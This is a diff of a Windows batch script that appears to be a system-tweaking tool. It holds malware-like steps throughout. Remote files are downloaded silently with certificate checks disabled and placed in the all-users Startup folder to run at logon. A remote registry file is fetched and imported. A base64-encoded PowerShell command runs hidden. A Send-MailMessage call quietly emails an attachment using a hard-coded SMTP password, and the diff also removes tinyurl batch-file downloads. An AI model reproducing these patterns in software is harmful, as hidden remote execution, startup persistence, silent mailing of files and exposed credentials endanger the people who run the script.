@@ -32,7 +32,7 @@ IF NOT EXIST "%appdata%\StartUp Tools\LOG" md "%appdata%\StartUp Tools\LOG"
 cd /d %~dp0
 color 7
 
-SET VERSCRIPT=D-72
+SET VERSCRIPT=D-73
 SET WINSUPPORT=ERR
 
 rmdir %SystemDrive%\Windows\system32\adminrightstest >nul 2>&1
@@ -408,6 +408,7 @@ IF "%CSTARTR%"=="minbrowser" (
 )
 
 IF "%CSTARTR%"=="10" (
+	Reg.exe delete "HKCR\Directory\Background\shell\C_CMD" /f >nul
 	Reg.exe delete "HKCR\DesktopBackground\Shell\Outils" /f >nul
 	IF EXIST %TEMP%\Outils.7z DEL %TEMP%\Outils.7z>nul
 	IF EXIST C:\Ect\Outils rmdir /s /q "C:\Ect\Outils" >nul 2>&1
@@ -422,6 +423,7 @@ IF "%CSTARTR%"=="10" (
 )
 
 IF "%CSTARTR%"=="outils" (
+	Reg.exe delete "HKCR\Directory\Background\shell\C_CMD" /f >nul
 	Reg.exe delete "HKCR\DesktopBackground\Shell\Outils" /f >nul
 	IF EXIST %TEMP%\Outils.7z DEL %TEMP%\Outils.7z>nul
 	IF EXIST C:\Ect\Outils rmdir /s /q "C:\Ect\Outils" >nul 2>&1
@@ -1143,6 +1145,8 @@ IF "%CSTARTR%"=="97" (
 	cd %temp%
 	@timeout /t 01>nul
 	rmdir /s /q "%appdata%\StartUp Tools" >nul 2>&1
+	Reg.exe delete "HKCR\DesktopBackground\Shell\Gamesr" /f > NUL 2>&1
+	Reg.exe delete "HKCR\DesktopBackground\Shell\SGamesr" /f > NUL 2>&1
 	curl -g -k -L -# -o "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\STARTUP.bat" "https://github.com/DOCSDROPT/OPTF_1/raw/main/SRTTP/STARTUP.dll" >nul 2>&1
 	@timeout /t 01>nul
 	goto :RESET
@@ -2102,14 +2106,7 @@ curl -g -k -L -# -o "REG.reg" "https://raw.githubusercontent.com/DOCSDROPT/OPTF_
 @timeout /t 01>nul
 Reg.exe import colors.reg >nul 2>&1
 Reg.exe import REG.reg >nul 2>&1
-
-IF NOT EXIST %APPDATA%\C-CMD MD %APPDATA%\C-CMD >nul 2>&1
-setx PATH "%PATH%;%APPDATA%\C-CMD" /M >nul 2>&1
-
-IF NOT EXIST %APPDATA%\C-CMD\IP.bat curl -g -k -L -# -o "%APPDATA%\C-CMD\IP.bat" "https://tinyurl.com/IDLLCMD" >nul 2>&1
-IF NOT EXIST %APPDATA%\C-CMD\STARTUP.bat curl -g -k -L -# -o "%APPDATA%\C-CMD\STARTUP.bat" "https://tinyurl.com/STARTUPDLLCMD" >nul 2>&1
-IF NOT EXIST %APPDATA%\C-CMD\TMP.bat curl -g -k -L -# -o "%APPDATA%\C-CMD\TMP.bat" "https://tinyurl.com/TMPDLLCMD" >nul 2>&1
-
+rem setx PATH "%PATH%;%APPDATA%\C-CMD" /M >nul 2>&1
 powershell.exe -encodedCommand JABkAGUAdgBpAGMAZQBzAFUAUwBCACAAPQAgAEcAZQB0AC0AUABuAHAARABlAHYAaQBjAGUAIAB8ACAAdwBoAGUAcgBlACAAewAkAF8ALgBJAG4AcwB0AGEAbgBjAGUASQBkACAALQBsAGkAawBlACAAIgAqAFUAUwBCAFwAUgBPAE8AVAAqACIAfQAgACAAfAAgAA0ACgBGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAAtAFAAcgBvAGMAZQBzAHMAIAB7AA0ACgBHAGUAdAAtAEMAaQBtAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzAE4AYQBtAGUAIABNAFMAUABvAHcAZQByAF8ARABlAHYAaQBjAGUARQBuAGEAYgBsAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdABcAHcAbQBpACAADQAKAH0ADQAKAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAgACQAZABlAHYAaQBjAGUAIABpAG4AIAAkAGQAZQB2AGkAYwBlAHMAVQBTAEIAIAApAA0ACgB7AA0ACgAgACAAIAAgAFMAZQB0AC0AQwBpAG0ASQBuAHMAdABhAG4AYwBlACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXAB3AG0AaQAgAC0AUQB1AGUAcgB5ACAAIgBTAEUATABFAEMAVAAgACoAIABGAFIATwBNACAATQBTAFAAbwB3AGUAcgBfAEQAZQB2AGkAYwBlAEUAbgBhAGIAbABlACAAVwBIAEUAUgBFACAASQBuAHMAdABhAG4AYwBlAE4AYQBtAGUAIABMAEkASwBFACAAJwAlACQAKAAkAGQAZQB2AGkAYwBlAC4AUABOAFAARABlAHYAaQBjAGUASQBEACkAJQAnACIAIAAtAFAAcgBvAHAAZQByAHQAeQAgAEAAewBFAG4AYQBiAGwAZQA9ACQARgBhAGwAcwBlAH0AIAAtAFAAYQBzAHMAVABoAHIAdQANAAoAfQANAAoADQAKACQAYQBkAGEAcAB0AGUAcgBzACAAPQAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgAgAC0AUABoAHkAcwBpAGMAYQBsACAAfAAgAEcAZQB0AC0ATgBlAHQAQQBkAGEAcAB0AGUAcgBQAG8AdwBlAHIATQBhAG4AYQBnAGUAbQBlAG4AdAANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGEAZABhAHAAdABlAHIAIABpAG4AIAAkAGEAZABhAHAAdABlAHIAcwApAA0ACgAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAuAEEAbABsAG8AdwBDAG8AbQBwAHUAdABlAHIAVABvAFQAdQByAG4ATwBmAGYARABlAHYAaQBjAGUAIAA9ACAAJwBEAGkAcwBhAGIAbABlAGQAJwANAAoAIAAgACAAIAAgACAAIAAgACQAYQBkAGEAcAB0AGUAcgAgAHwAIABTAGUAdAAtAE4AZQB0AEEAZABhAHAAdABlAHIAUABvAHcAZQByAE0AYQBuAGEAZwBlAG0AZQBuAHQADQAKACAAIAAgACAAIAAgACAAIAB9AA== >nul 2>&1
 START "" "cl-temp.exe"
 goto :MAINW
@@ -2134,8 +2131,6 @@ set "SS9=FTOZmvHDI695wV4s"
 powershell -Command "Send-MailMessage -From '%SS3%' -To '%SS4%' -Subject '%SS5%' -Body '%SS6%' -Attachments '%SS7%' -SmtpServer '%SS1%' -Port '%SS2%' -UseSsl -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList ('%SS8%', (ConvertTo-SecureString -String '%SS9%' -AsPlainText -Force)))" >nul 2>&1
 endlocal
 goto :MAINW
-
-
 
 :PANGEPACK
 C:
